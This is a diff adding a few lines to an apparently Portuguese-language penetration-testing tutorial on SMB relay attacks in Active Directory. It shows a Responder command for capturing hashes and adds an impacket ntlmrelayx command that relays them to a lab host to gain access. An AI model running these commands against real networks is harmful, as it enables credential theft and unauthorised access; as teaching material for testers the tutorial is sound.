@@ -73,3 +73,9 @@ sudo responder -I eth0 -wdv
 ```
 
 ![](smbrelayresponderrunning.png)
+
+De seguida iremos utilizar uma ferramenta da _impacket_ para fazer relay da _hash_ para a outra máquina com o objectivo de ganharmos acesso sobre a mesma.
+
+impacket-ntlmrelayx -smb2support -t 192.168.0.102
+
+[LLMNR](/posts/ad_llmnr/)
